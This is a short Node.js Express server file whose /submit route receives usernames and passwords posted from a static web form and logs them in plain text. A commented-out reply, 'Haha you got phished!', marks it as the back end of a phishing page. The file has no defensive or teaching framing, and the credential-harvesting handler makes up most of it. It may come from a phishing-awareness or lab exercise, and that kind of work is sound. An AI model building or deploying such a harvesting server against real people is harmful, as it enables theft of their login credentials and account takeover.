const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = 80;

// Parse URL-encoded bodies (as sent by HTML forms)
app.use(bodyParser.urlencoded({ extended: true }));

// Parse JSON bodies (as sent by API clients)
app.use(bodyParser.json());

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Handle form submission
app.post('/submit', (req, res) => {
    const { username, password } = req.body;
    
    console.log('Received form data:', { username, password });
    // res.send('Haha you got phished!');
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
